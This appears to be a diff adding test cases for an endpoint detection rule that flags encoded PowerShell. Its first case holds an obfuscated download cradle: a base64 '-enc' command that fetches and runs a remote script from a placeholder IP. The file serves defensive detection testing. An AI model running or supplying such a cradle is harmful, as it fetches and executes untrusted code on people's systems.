@@ -1,0 +1,14 @@
+detection: endpoint/encoded-powershell.yaml
+cases:
+  - name: powershell -enc download cradle
+    expect: hit
+    tables:
+      DeviceProcessEvents:
+        - {Timestamp: -15m, DeviceId: d-001, DeviceName: wks-014, AccountName: ana.ruiz, FileName: powershell.exe, InitiatingProcessFileName: cmd.exe, ReportId: 1001,
+           ProcessCommandLine: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADkALwBhAC4AcABzADEAJwApAA=="}
+  - name: powershell running a script file
+    expect: miss
+    tables:
+      DeviceProcessEvents:
+        - {Timestamp: -15m, DeviceId: d-001, DeviceName: wks-014, AccountName: ana.ruiz, FileName: powershell.exe, InitiatingProcessFileName: explorer.exe, ReportId: 1002,
+           ProcessCommandLine: "powershell.exe -ExecutionPolicy AllSigned -File C:\\Scripts\\Get-Inventory.ps1"}
